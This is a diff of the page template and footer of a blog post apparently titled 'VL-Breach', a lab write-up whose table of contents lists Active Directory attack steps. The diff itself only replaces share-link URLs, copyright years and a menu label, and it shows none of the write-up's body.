class="toc-link" href="#Accessing-Julia-Wong%E2%80%99s-Files"><span class="toc-number">1.2.3.</span> <span class="toc-text">Accessing Julia Wong’s Files</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">1.3.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BloodHound-Enumeration"><span class="toc-number">1.3.1.</span> <span class="toc-text">BloodHound Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberoasting"><span class="toc-number">1.3.2.</span> <span class="toc-text">Kerberoasting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL-Access"><span class="toc-number">1.3.3.</span> <span class="toc-text">MSSQL Access</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Silver-Ticket-Attack"><span class="toc-number">1.3.4.</span> <span class="toc-text">Silver Ticket Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Getting-a-Reverse-Shell"><span class="toc-number">1.3.5.</span> <span class="toc-text">Getting a Reverse Shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-to-SYSTEM"><span class="toc-number">1.4.</span> <span class="toc-text">Privilege Escalation to SYSTEM</span></a></li></ol></li></ol>
       </div>
     
 
     <div id="share-footer" style="display: none">
       <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/03/18/VL-Breach/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/03/18/VL-Breach/&text=VL-Breach"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/03/18/VL-Breach/&title=VL-Breach"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/03/18/VL-Breach/&is_video=false&description=VL-Breach"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=VL-Breach&body=Check out this article: https://panosoikogr.github.io/2025/03/18/VL-Breach/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/03/18/VL-Breach/&title=VL-Breach"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/03/18/VL-Breach/&title=VL-Breach"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/03/18/VL-Breach/&title=VL-Breach"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/03/18/VL-Breach/&title=VL-Breach"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/03/18/VL-Breach/&name=VL-Breach&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/03/18/VL-Breach/&t=VL-Breach"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/03/18/VL-Breach/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/03/18/VL-Breach/&text=VL-Breach"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/03/18/VL-Breach/&title=VL-Breach"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/03/18/VL-Breach/&is_video=false&description=VL-Breach"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VL-Breach&body=Check out this article: http://example.com/2025/03/18/VL-Breach/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/03/18/VL-Breach/&title=VL-Breach"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/03/18/VL-Breach/&title=VL-Breach"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/03/18/VL-Breach/&title=VL-Breach"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/03/18/VL-Breach/&title=VL-Breach"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/03/18/VL-Breach/&name=VL-Breach&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/03/18/VL-Breach/&t=VL-Breach"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
@@ -317,7 +324,7 @@
     Copyright &copy;
     
     
-    2016-2025
+    2024-2027
     Panosoiko
   </div>
   <div class="footer-right">
@@ -332,7 +339,7 @@
      --><!--
        --><li><a href="/search/">Search</a></li><!--
      --><!--
-       --><li><a href="/tags/">Tags</a></li><!--
+       --><li><a href="/tags/">tags</a></li><!--
      --><!--
        --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
      -->
